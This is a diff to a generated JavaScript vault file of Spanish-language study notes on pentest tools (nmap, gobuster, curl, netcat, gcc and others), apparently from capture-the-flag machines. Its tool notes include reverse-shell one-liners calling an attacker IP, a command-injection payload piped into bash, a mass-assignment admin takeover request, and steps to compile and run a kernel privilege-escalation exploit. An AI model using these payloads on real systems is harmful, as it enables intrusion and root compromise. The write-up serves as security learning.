@@ -1,8 +1,309 @@
 /* Generado por tools/sync_vault.py — no editar a mano */
 window.VAULT = {
- "generated": "2026-11-17T02:42:08+00:00",
+ "generated": "2026-11-17T02:50:43+00:00",
  "vaultName": "Cybersecurity",
  "notes": [
+  {
+   "id": "gcc",
+   "title": "gcc",
+   "path": "02 Herramientas/gcc.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "explotación / compilación",
+    "tags": [
+     "herramienta",
+     "explotación"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "explotación"
+   ],
+   "links": [
+    "TwoMillion",
+    "CVE-2023-0386",
+    "DoubleTake",
+    "CVE-2026-41567",
+    "ssh"
+   ],
+   "embargo": false,
+   "body": "# gcc (compilar y preparar exploits)\n\n**La idea:** muchos exploits —sobre todo los de **escalada de privilegios por kernel**— vienen en C y hay que **compilarlos** antes de usarlos. `gcc` es el compilador: convierte el `.c` del PoC en un binario ejecutable. Entender dos o tres flags te deja usar casi cualquier exploit público de GitHub.\n\n## Cómo lo uso\n\nCompilación simple:\n```bash\ngcc exploit.c -o exploit\n```\n\nCaso real de [[TwoMillion]] — PoC de [[CVE-2023-0386]] (OverlayFS/FUSE), vía `make all`:\n```bash\ngcc fuse.c -o fuse -D_FILE_OFFSET_BITS=64 -static -pthread -lfuse -ldl\ngcc -o exp exp.c -lcap\ngcc -o gc getshell.c\n```\n\n| Flag | Qué hace |\n| --- | --- |\n| `-o <nombre>` | Nombre del binario de salida |\n| `-static` | Mete todo adentro del binario; corre aunque el objetivo no tenga las librerías |\n| `-pthread` | Enlaza *pthreads* (hilos) |\n| `-lfuse` / `-ldl` / `-lcap` | Enlaza librerías (`-l` + nombre): FUSE, *dlopen*, *capabilities* |\n| `-D_FILE_OFFSET_BITS=64` | Define una macro que el código necesita para compilar bien |\n\nCuando el repo trae un `Makefile`, directamente `make all` corre todos esos `gcc` por vos.\n\n## El resto del \"kit de exploit\"\n\nCasi siempre acompañan a `gcc`:\n- **git** → `git clone https://github.com/xkaneiki/CVE-2023-0386` para bajar el PoC.\n- **zip** / **tar** → empaquetar: en [[TwoMillion]] `zip -r cve.zip CVE-2023-0386`; en [[DoubleTake]] `tar cf ../plant.tar usr/bin/xz` para armar el paquete del `xz` troyano del escape de Docker ([[CVE-2026-41567]]).\n- **[[ssh|scp]]** → subir el paquete al objetivo (`scp cve.zip user@IP:/tmp`).\n- Después, compilar **en el objetivo** y disparar: `./fuse ./ovlcap/lower ./gc &` + `./exp` → shell de root.\n\n## Tips\n- Compilá, idealmente, **en una máquina igual al objetivo** (misma arquitectura/glibc) o usá `-static` para evitar el típico \"version GLIBC not found\".\n- Si `gcc` tira warnings pero genera el binario igual, suele andar — los errores que frenan son los de *linker* (`undefined reference`), que se arreglan con el `-l` que falte.\n- Relacionado: [[ssh]], [[CVE-2023-0386]], [[CVE-2026-41567]], [[TwoMillion]], [[DoubleTake]].\n",
+   "mtime": "2026-11-17T02:50:21.286837+00:00"
+  },
+  {
+   "id": "base64",
+   "title": "base64",
+   "path": "02 Herramientas/base64.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "utilidad / datos",
+    "tags": [
+     "herramienta",
+     "utilidad"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "utilidad"
+   ],
+   "links": [
+    "TwoMillion",
+    "curl",
+    "netcat",
+    "DoubleTake"
+   ],
+   "embargo": false,
+   "body": "# base64\n\n**La idea:** base64 no cifra nada, solo **re-escribe datos binarios como texto plano** (letras, números, `+/=`). En CTFs aparece todo el tiempo por dos razones: muchas apps te devuelven cosas \"codificadas en base64\" que en realidad son legibles, y a la vez es la forma más segura de **mandar un payload** sin que se rompa con comillas o caracteres raros.\n\n## Cómo lo uso\n\nDecodificar (el `-d`):\n```bash\necho 'Q29ycmVjdEhvcnNlQmF0dGVyeVN0YXBsZQ==' | base64 -d\n```\n\nCodificar (sin flag):\n```bash\necho -n 'bash -i >& /dev/tcp/10.10.14.1/4444 0>&1' | base64\n```\n\n## Dónde lo usé\n- En [[TwoMillion]]: la API devolvía el código de invitación \"codificado\"; `echo <cadena> | base64 -d` lo transformó en el código real. Y a la inversa, **codifiqué la *reverse shell*** para inyectarla limpia con [[curl]] (`... | base64 -d | bash`), que la recibió [[netcat]].\n- En [[DoubleTake]]: decodifiqué `encryptedPassword` del `logins.json` de Firefox → `CorrectHorseBatteryStaple`, la contraseña del usuario `bob`.\n\n## Tips\n- Si una cadena termina en `=` o `==` y es solo `[A-Za-z0-9+/]`, casi seguro es base64 — probá decodificarla.\n- `echo -n` (sin salto de línea) importa al **codificar**, si no metés un `\\n` de más.\n- Para cadenas con varias capas o formatos raros, **CyberChef** hace lo mismo visualmente.\n- Relacionado: [[curl]], [[netcat]], [[TwoMillion]], [[DoubleTake]].\n",
+   "mtime": "2026-11-17T02:50:05.846581+00:00"
+  },
+  {
+   "id": "jq",
+   "title": "jq",
+   "path": "02 Herramientas/jq.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "utilidad / datos",
+    "web": "https://jqlang.github.io/jq/",
+    "tags": [
+     "herramienta",
+     "utilidad",
+     "api"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "utilidad",
+    "api"
+   ],
+   "links": [
+    "curl",
+    "TwoMillion"
+   ],
+   "embargo": false,
+   "body": "# jq\n\n**La idea:** las APIs contestan **JSON**, y un JSON en una sola línea es ilegible. `jq` lo **formatea, colorea y filtra**. No es una herramienta de ataque por sí sola, pero es la que hace que enumerar una API con [[curl]] sea entendible en vez de una sopa de llaves.\n\n## Cómo lo uso\n\nFormatear (lo más común) — se encadena con una tubería:\n```bash\ncurl -s http://<IP>/api/v1 --cookie \"PHPSESSID=...\" | jq\n```\n\nFiltrar un campo puntual:\n```bash\ncurl -s http://<IP>/api/v1 | jq '.data.code'\n```\n\n## Dónde lo usé\n\nEn [[TwoMillion]] fue mi lupa sobre la API: pipeando cada `curl ... | jq` leí cómodo la **lista de rutas** (`/api/v1/admin/...`), la respuesta del generador de código de invitación y la confirmación de `is_admin`. Sin `jq` todo eso venía apelmazado en una línea.\n\n## Mini-sintaxis útil\n| Expresión | Qué saca |\n| --- | --- |\n| `jq .` | Todo, formateado |\n| `jq '.campo'` | Un campo |\n| `jq '.data.code'` | Un campo anidado |\n| `jq '.[].name'` | El `name` de cada elemento de un array |\n| `jq -r '.token'` | *Raw*: sin comillas (para pasarlo a otro comando) |\n\n## Tips\n- `-r` (*raw output*) es clave cuando el valor lo vas a reusar en otro comando.\n- Relacionado: [[curl]], [[TwoMillion]].\n",
+   "mtime": "2026-11-17T02:49:53.866656+00:00"
+  },
+  {
+   "id": "ssh",
+   "title": "ssh",
+   "path": "02 Herramientas/ssh.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "acceso remoto",
+    "web": "https://www.openssh.com",
+    "tags": [
+     "herramienta",
+     "acceso",
+     "red"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "acceso",
+    "red"
+   ],
+   "links": [
+    "22 SSH",
+    "netcat",
+    "DoubleTake",
+    "CVE-2026-123158",
+    "TwoMillion",
+    "CVE-2023-0386",
+    "gcc",
+    "Cap"
+   ],
+   "embargo": false,
+   "body": "# ssh (y scp)\n\n**La idea:** `ssh` es el acceso remoto cifrado por línea de comandos. En un CTF suele ser el **objetivo del acceso inicial**: en cuanto consigo un usuario y una contraseña (filtrada, reutilizada o adivinada), entro por el [[22 SSH]] y ya tengo una shell cómoda y estable, mucho mejor que una *reverse shell* de [[netcat]].\n\n## Cómo lo uso\n\n```bash\nssh usuario@<IP>\n```\n\nLa primera vez pregunta por la *fingerprint* del host (`yes`) y después pide la contraseña.\n\n## Dónde lo usé\n- En [[DoubleTake]]: `ssh alpine@<IP>` fue el **acceso inicial**, abusando del bypass de autenticación de sshd sobre `musl` ([[CVE-2026-123158]]). Después `ssh bob@<IP>` con las credenciales `bob:CorrectHorseBatteryStaple` encontradas en el `logins.json` de Firefox → *user flag*.\n- En [[TwoMillion]]: `ssh admin@<IP>` **reutilizando** la contraseña de la base de datos (`.env`) que leí como `www-data` → *user flag*.\n\n## scp — mover archivos por el mismo túnel\n\n```bash\nscp exploit.zip usuario@<IP>:/tmp/\n```\n\nEn [[TwoMillion]] usé `scp` para **subir el PoC** de [[CVE-2023-0386]] a `/tmp` del objetivo antes de compilarlo con [[gcc]].\n\n## Tips\n- La reutilización de credenciales es un clásico: una pass que encontrás en un servicio probala **siempre** en SSH.\n- Si tenés clave privada en vez de pass: `ssh -i id_rsa usuario@IP` (y `chmod 600 id_rsa`).\n- La defensa que corta todo esto: `PasswordAuthentication no` (solo claves).\n- Relacionado: [[22 SSH]], [[netcat]], [[gcc]], [[DoubleTake]], [[TwoMillion]], [[Cap]].\n",
+   "mtime": "2026-11-17T02:49:43.225785+00:00"
+  },
+  {
+   "id": "netcat",
+   "title": "netcat",
+   "path": "02 Herramientas/netcat.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "shells / red",
+    "web": "https://nmap.org/ncat/",
+    "tags": [
+     "herramienta",
+     "shells",
+     "red"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "shells",
+    "red"
+   ],
+   "links": [
+    "TwoMillion",
+    "curl",
+    "DoubleTake",
+    "CVE-2026-41567",
+    "base64",
+    "ssh"
+   ],
+   "embargo": false,
+   "body": "# netcat (nc)\n\n**La idea:** `nc` es \"la navaja suiza de TCP\". Abre o escucha una conexión cruda por un puerto y lo que entra por un lado sale por el otro. En explotación lo uso para una cosa clave: **recibir la *reverse shell***. Cuando logro ejecución de comandos en el objetivo, le digo que me \"llame\" a mí, y del otro lado tengo un `nc` escuchando que me entrega la shell.\n\n## Cómo lo uso\n\n```bash\nnc -lvnp 4444\n```\n\n| Flag | Qué hace |\n| --- | --- |\n| `-l` | *Listen*: modo escucha (yo soy el que espera la conexión) |\n| `-v` | *Verbose*: me avisa cuándo y desde dónde se conectan |\n| `-n` | Sin resolución DNS (numérico, más rápido) |\n| `-p 4444` | El **puerto** donde escucho |\n\nDel lado del objetivo se dispara algo como:\n```bash\nbash -i >& /dev/tcp/<MI_IP>/4444 0>&1\n```\nque es \"abrí una bash interactiva y mandá su entrada/salida a mi IP:puerto\".\n\n## Dónde lo usé\n- En [[TwoMillion]]: `nc -lvp 1234` recibió la shell de `www-data` tras la inyección de comandos con [[curl]].\n- En [[DoubleTake]]: `nc -lvnp 4444` recibió la shell de **root del host** cuando el `xz` troyano del escape de Docker se ejecutó (`[[CVE-2026-41567]]`).\n\n## Tips\n- La shell que llega es \"tonta\" (`no job control`). La mejoro con:\n  `python3 -c 'import pty;pty.spawn(\"/bin/bash\")'` + `Ctrl+Z`, `stty raw -echo; fg`.\n- El payload de la *reverse shell* muchas veces viaja en [[base64]] para no romperse con comillas y caracteres raros.\n- Variante más completa: `ncat` (del proyecto Nmap) soporta TLS.\n- Relacionado: [[curl]], [[base64]], [[ssh]], [[TwoMillion]], [[DoubleTake]].\n",
+   "mtime": "2026-11-17T02:49:29.190506+00:00"
+  },
+  {
+   "id": "Burp Suite",
+   "title": "Burp Suite",
+   "path": "02 Herramientas/Burp Suite.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "web / proxy",
+    "web": "https://portswigger.net/burp",
+    "tags": [
+     "herramienta",
+     "web",
+     "proxy"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "web",
+    "proxy"
+   ],
+   "links": [
+    "curl",
+    "TwoMillion",
+    "80 HTTP"
+   ],
+   "embargo": false,
+   "body": "# Burp Suite\n\n**La idea:** Burp es un **proxy que se sienta entre tu navegador y la web**. Todo lo que mandás pasa por él, así que podés **frenar una petición, mirarla, modificarla y reenviarla**. Donde [[curl]] es el bisturí de línea de comandos, Burp es el banco de trabajo visual: ves el tráfico real del navegador y jugás con él.\n\n## Las piezas que uso\n\n| Pestaña | Para qué |\n| --- | --- |\n| **Proxy → Intercept** | Frena la petición en el aire para editarla antes de que salga |\n| **HTTP history** | El registro de todo lo que pasó el navegador: oro para entender una app |\n| **Repeater** | Mandás la misma petición una y otra vez cambiando un detalle (el mejor amigo para probar *mass-assignment*, IDOR, inyecciones) |\n| **Intruder** | Automatiza esa repetición con una lista de valores (fuzzing de parámetros) |\n| **Decoder** | Codifica/decodifica base64, URL, hex sin salir de Burp |\n\n## Cómo lo usé\n\nEn [[TwoMillion]] lo usé para **capturar y leer las peticiones reales del navegador** contra la plataforma y entender cómo armaba las llamadas a la API (rutas, cookie `PHPSESSID`, cabeceras). Una vez entendida la estructura, la explotación fina la terminé replicando a mano con [[curl]], que es más cómodo para scriptear la cadena.\n\n## Flujo típico\n1. Configurar el navegador (o FoxyProxy) para pasar por `127.0.0.1:8080`.\n2. Navegar normal con **HTTP history** grabando.\n3. Mandar la petición interesante a **Repeater** (`Ctrl+R`).\n4. Cambiar un campo (por ejemplo `is_admin`), reenviar, leer la respuesta. Repetir.\n\n## Tips\n- Para HTTPS hay que instalar el **certificado CA de Burp** en el navegador, si no, da errores de certificado.\n- Burp (Repeater) y [[curl]] son intercambiables: uno es visual, el otro scriptable. Vale saber los dos.\n- Relacionado: [[curl]], [[TwoMillion]], [[80 HTTP]].\n",
+   "mtime": "2026-11-17T02:49:16.270008+00:00"
+  },
+  {
+   "id": "curl",
+   "title": "curl",
+   "path": "02 Herramientas/curl.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "web / API",
+    "web": "https://curl.se",
+    "tags": [
+     "herramienta",
+     "web",
+     "api"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "web",
+    "api"
+   ],
+   "links": [
+    "TwoMillion",
+    "jq",
+    "netcat",
+    "Burp Suite",
+    "base64",
+    "80 HTTP"
+   ],
+   "embargo": false,
+   "body": "# curl\n\n**La idea:** `curl` es un navegador sin interfaz. Le armás una petición HTTP exactamente como vos querés —método, cabeceras, cookies, cuerpo— y ves la respuesta cruda. Para atacar **APIs** es la herramienta reina: podés mandar lo que el navegador nunca te dejaría mandar. En [[TwoMillion]] la máquina entera cayó a puro `curl`.\n\n## Las flags que más uso\n\n| Flag | Qué hace |\n| --- | --- |\n| `-s` | *Silent*: sin barra de progreso, salida limpia (ideal para pipear a [[jq]]) |\n| `-v` | *Verbose*: muestra toda la conversación (request y response, cabeceras incluidas) |\n| `-X` | El **método** HTTP (`GET`, `POST`, `PUT`, `DELETE`…) |\n| `--cookie` | Manda la **cookie de sesión** (p. ej. `PHPSESSID=...`) para ir autenticado |\n| `--header` / `-H` | Agrega una **cabecera**, típico `Content-Type: application/json` |\n| `--data` / `-d` | El **cuerpo** de la petición (el JSON o los campos del POST) |\n\n## Cómo lo usé en [[TwoMillion]] (la cadena completa)\n\n**1. Enumerar la API** (con la cookie de sesión, formateando con [[jq]]):\n```bash\ncurl -s 2million.htb/api/v1 --cookie \"PHPSESSID=...\" | jq\n```\nMe listó todas las rutas, incluidas las de `admin`.\n\n**2. Escalar a admin por *mass-assignment*** — el endpoint confía en el cuerpo y no valida qué campos tocás:\n```bash\ncurl -X PUT http://2million.htb/api/v1/admin/settings/update \\\n  --cookie \"PHPSESSID=...\" --header \"Content-Type: application/json\" \\\n  --data '{\"email\":\"hacked@gmail.com\",\"is_admin\":1}'\n```\nRespuesta: `\"is_admin\": 1` → ya era administrador.\n\n**3. RCE por inyección de comandos** — el `username` del generador de VPN terminaba en una shell sin sanear:\n```bash\ncurl -X POST http://2million.htb/api/v1/admin/vpn/generate \\\n  --cookie \"PHPSESSID=...\" --header \"Content-Type: application/json\" \\\n  --data '{\"username\":\"hacked;echo <payload_base64> | base64 -d | bash;\"}'\n```\nEl `;` cierra el comando y mete el mío → *reverse shell* a mi [[netcat]].\n\n## Tips\n- `curl -I <url>` trae **solo las cabeceras** (rápido para ver servidor/redirects).\n- Si una respuesta es JSON, encadenalo con [[jq]]: `curl -s ... | jq`.\n- Para campañas más cómodas de *repeat & tweak*, lo mismo se hace en [[Burp Suite]] (Repeater).\n- Relacionado: [[jq]], [[base64]], [[Burp Suite]], [[TwoMillion]], [[80 HTTP]].\n",
+   "mtime": "2026-11-17T02:49:02.638450+00:00"
+  },
+  {
+   "id": "whatweb",
+   "title": "whatweb",
+   "path": "02 Herramientas/whatweb.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "reconocimiento web",
+    "web": "https://github.com/urbanadventurer/WhatWeb",
+    "tags": [
+     "herramienta",
+     "recon",
+     "web"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "recon",
+    "web"
+   ],
+   "links": [
+    "DoubleTake",
+    "curl",
+    "nmap",
+    "gobuster"
+   ],
+   "embargo": false,
+   "body": "# whatweb\n\n**La idea:** antes de meterme a romper una web quiero saber **con qué está hecha**: qué servidor, qué framework, qué versión, si hay algún CMS conocido. `whatweb` le pega una vez a la página y te devuelve esa \"ficha técnica\" en una línea. Es reconocimiento pasivo/liviano: huella digital de la web.\n\n## Cómo lo uso\n\n```bash\nwhatweb http://<IP>/\n```\n\n## Qué me dice\n\nEn [[DoubleTake]] me devolvió:\n\n```\n[401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[Ubuntu Linux][nginx/1.24.0 (Ubuntu)],\nIP[10.129.150.237], WWW-Authenticate[Zentara][Basic], nginx[1.24.0]\n```\n\nDe ahí saqué tres cosas sin tocar nada:\n- El servidor es **nginx 1.24.0 sobre Ubuntu** (versión para buscar CVEs).\n- La web se llama **Zentara** y pide **autenticación Basic** (`WWW-Authenticate`), así que hay un login por delante.\n- El `401` confirma que hay contenido protegido, no un sitio vacío.\n\n## Tips\n- Subí el detalle con `-a 3` (*aggression level*): hace más requests y detecta más cosas.\n- Es complementario, no reemplaza mirar las **cabeceras** a mano con [[curl]] `-I` ni el código fuente / JS en el navegador.\n- Relacionado: [[nmap]], [[gobuster]], [[curl]].\n",
+   "mtime": "2026-11-17T02:48:39.929842+00:00"
+  },
+  {
+   "id": "gobuster",
+   "title": "gobuster",
+   "path": "02 Herramientas/gobuster.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "reconocimiento web",
+    "web": "https://github.com/OJ/gobuster",
+    "tags": [
+     "herramienta",
+     "recon",
+     "web"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "recon",
+    "web"
+   ],
+   "links": [
+    "DoubleTake",
+    "TwoMillion",
+    "nmap",
+    "80 HTTP",
+    "whatweb",
+    "curl"
+   ],
+   "embargo": false,
+   "body": "# gobuster\n\n**La idea:** una web casi nunca te muestra todo desde la home. Hay rutas que existen pero no están linkeadas: `/admin`, `/api`, `/backup`, `/invite`… `gobuster` **adivina rutas a fuerza bruta** probando palabra por palabra de un diccionario y te dice cuáles responden. Es \"abrir todas las puertas del edificio para ver cuáles no están con llave\".\n\n## Cómo lo uso\n\n```bash\ngobuster dir -u http://<IP>/ \\\n  -w /usr/share/wordlists/dirb/common.txt \\\n  -s 200,204,301,302,307,401,403 \\\n  -b \"\"\n```\n\n## Las flags, una por una\n\n| Flag | Qué hace |\n| --- | --- |\n| `dir` | Modo **directorios/archivos** (también existe `dns` y `vhost`) |\n| `-u` | La **URL** base del objetivo |\n| `-w` | El **diccionario** (*wordlist*): la lista de nombres a probar. `dirb/common.txt` es mi arranque; para ir más a fondo, los de `seclists` |\n| `-s` | **Status codes** que considero \"existe\": sumo `401`/`403` porque un *Forbidden* igual me confirma que la ruta está ahí |\n| `-b` | *Blacklist* de códigos a ignorar. Lo pongo en `\"\"` para no filtrar nada y ver todo |\n\n## Qué saqué\n\n- En [[DoubleTake]] todo daba `401` (la web pedía auth Basic), pero igual me confirmó rutas reales: `agents`, `deploy`, `files`, `settings`, `status`, `usage`.\n- En [[TwoMillion]] encontré `/invite`, `/register`, `/login`, `/api`, `/home` → de `/invite` salió el bypass del código de invitación.\n\n## Tips\n- Si todo da `403`, probá otra *wordlist* o agregá extensiones con `-x php,txt,bak`.\n- El `[Size: 0]` importa: dos rutas con el mismo tamaño de respuesta suelen ser la misma página de error.\n- Alternativas con la misma idea: `ffuf`, `feroxbuster`, `dirsearch`.\n- Relacionado: [[nmap]] (que me dice que hay un [[80 HTTP]]), [[whatweb]], [[curl]].\n",
+   "mtime": "2026-11-17T02:48:29.534613+00:00"
+  },
+  {
+   "id": "nmap",
+   "title": "nmap",
+   "path": "02 Herramientas/nmap.md",
+   "folder": "02 Herramientas",
+   "props": {
+    "tipo": "herramienta",
+    "categoria": "reconocimiento",
+    "web": "https://nmap.org",
+    "tags": [
+     "herramienta",
+     "recon"
+    ]
+   },
+   "tags": [
+    "herramienta",
+    "recon"
+   ],
+   "links": [
+    "DoubleTake",
+    "TwoMillion",
+    "80 HTTP",
+    "gobuster",
+    "whatweb"
+   ],
+   "embargo": false,
+   "body": "# nmap\n\n**La idea:** antes de atacar algo tenés que saber qué hay. `nmap` es el mapa del objetivo: le manda paquetes a cada puerto y te dice **cuáles están abiertos, qué servicio corre y qué versión**. Es el primer comando que tiro en cualquier máquina — todo lo demás (la web, el SSH, el exploit) sale de leer bien este escaneo.\n\n## Cómo lo uso\n\n```bash\nnmap -p- --open -sS -sC -sV --min-rate 5000 -n -Pn -oN nmap.txt <IP>\n```\n\nEse es mi escaneo \"de entrada\" y lo usé igual en [[DoubleTake]] y en [[TwoMillion]].\n\n## Las flags, una por una\n\n| Flag | Qué hace | Por qué la uso |\n| --- | --- | --- |\n| `-p-` | Escanea **los 65535 puertos**, no solo los 1000 top | Un servicio escondido en un puerto alto es justo donde está la vuln |\n| `--open` | Muestra solo los puertos **abiertos** | El ruido de `closed/filtered` no me sirve |\n| `-sS` | *SYN scan* (medio-abierto): manda SYN y no completa el *handshake* | Más rápido y discreto; necesita root (`--privileged`/sudo) |\n| `-sC` | Corre los **scripts por defecto** (NSE) | Da pistas gratis: títulos, auth, banners |\n| `-sV` | Detecta **versión** del servicio | La versión exacta es la que buscás en el exploit (p. ej. \"OpenSSH 10.6\") |\n| `--min-rate 5000` | Fuerza un mínimo de 5000 paquetes/s | En un lab acelera muchísimo el `-p-` |\n| `-n` | **No** resuelve DNS | Evita esperas inútiles |\n| `-Pn` | **No** hace ping previo, asume que el host está vivo | Muchos objetivos ignoran el ping y te saltearías el escaneo |\n| `-oN nmap.txt` | Guarda la salida en texto | Para volver a leerla sin re-escanear |\n\n## Qué saqué leyéndolo\n\n- En [[DoubleTake]]: `22/tcp OpenSSH 10.6` y `80/tcp nginx` con `401 Basic realm=Zentara`. El banner olía a **Alpine** → `musl` en vez de glibc, que fue la clave del primer CVE.\n- En [[TwoMillion]]: `22` y `80` → toda la cadena fue por la **web/API** del puerto [[80 HTTP]].\n\n## Tips\n- `-sC -sV` juntos se abrevian `-A`, pero `-A` agrega traceroute y OS detection (más ruidoso).\n- Primero un `-p-` rápido para sacar los puertos, después un `-sC -sV` dirigido **solo a esos puertos** (`-p 22,80`) para enumerar a fondo sin esperar.\n- Relacionado: [[gobuster]] (cuando aparece un [[80 HTTP]]), [[whatweb]].\n",
+   "mtime": "2026-11-17T02:48:15.559713+00:00"
+  },
   {
    "id": "80 HTTP",
    "title": "80 HTTP",
